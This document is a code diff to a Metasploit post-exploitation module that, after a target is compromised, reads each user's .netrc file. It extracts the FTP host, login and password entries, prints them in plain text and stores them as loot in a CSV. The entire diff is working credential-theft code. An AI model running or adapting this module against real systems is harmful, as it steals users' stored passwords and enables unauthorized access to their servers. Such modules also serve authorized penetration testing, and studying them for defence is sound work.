@@ -21,55 +21,63 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
+		# A table to store the found credentials.
+		cred_table = Rex::Ui::Text::Table.new(
+		'Header'    => ".netrc credentials",
+		'Indent'    => 1,
+		'Columns'   =>
+		[
+			"Username",
+			"Password",
+			"Server",
+		])
+
+		# all of the credentials we've found from .netrc
 		creds = []
+
 		# walk through each user directory
 		enum_user_directories.each do |user_dir|
 			netrc_file = user_dir + "/.netrc"
-			cred = { :file => netrc_file }
-			# read their .netrc
-			cmd_exec("test -r #{netrc_file} && cat #{netrc_file}").each_line do |netrc_line|
-				# parse it
-				netrc_line.strip!
-				# get the machine name
-				if (netrc_line =~ /machine (\S+)/)
-					# if we've already found a machine, save this cred and start over
-					if (cred[:host])
-						creds << cred
-						cred = { :file => netrc_file }
+			# the current credential from .netrc we are parsing
+			cred = {}
+			begin
+				# read their .netrc
+				cmd_exec("test -r #{netrc_file} && cat #{netrc_file}").each_line do |netrc_line|
+					# parse it
+					netrc_line.strip!
+					# get the machine name
+					if (netrc_line =~ /machine (\S+)/)
+						# if we've already found a machine, save this cred and start over
+						if (cred[:host])
+							creds << cred
+							cred = {}
+						end
+						cred[:host] = $1
 					end
-					cred[:host] = $1
+					# get the user name
+					if (netrc_line =~ /login (\S+)/)
+						cred[:user] = $1
+					end
+					# get the password
+					if (netrc_line =~ /password (\S+)/)
+						cred[:pass] = $1
+					end
 				end
-				# get the user name
-				if (netrc_line =~ /login (\S+)/)
-					cred[:user] = $1
-				end
-				# get the password
-				if (netrc_line =~ /password (\S+)/)
-					cred[:pass] = $1
-				end
+			rescue ::Exception => e
+				print_error("Couldn't read #{netrc_file}: #{e.to_s}")
 			end
 			# save whatever remains of this last cred if it is worth saving
 			creds << cred if (cred[:host] and cred[:user] and cred[:pass])
 		end
 
-		# store all found credentials
+		# print out everything we've found
 		creds.each do |cred|
-			report_netrc_creds(cred, cred[:file])
+			cred_table << [ cred[:user], cred[:pass], cred[:host] ]
+			print_good("netrc (FTP) credentials: user=#{cred[:user]}, pass=#{cred[:pass]}, host=#{cred[:host]}")
 		end
+
+		# store all found credentials
+		store_loot("netrc.creds", "text/csv", session, creds.to_csv, "netrc_credentials.txt", ".netrc credentials")
 	end
 
-	# Report FTP auth info +auth+ found in +file+
-	def report_netrc_creds(auth, file)
-		# report if we found something
-		if (auth[:host] and (auth[:user] or auth[:pass]))
-			auth = {
-				:port => 21,
-				:sname => 'ftp',
-				:type => 'password',
-				:active => true
-			}.merge(auth)
-			report_auth_info(auth)
-			print_good("FTP credentials: user=#{auth[:user]}, pass=#{auth[:pass]}, host=#{auth[:host]} from #{file}")
-		end
-	end
 end
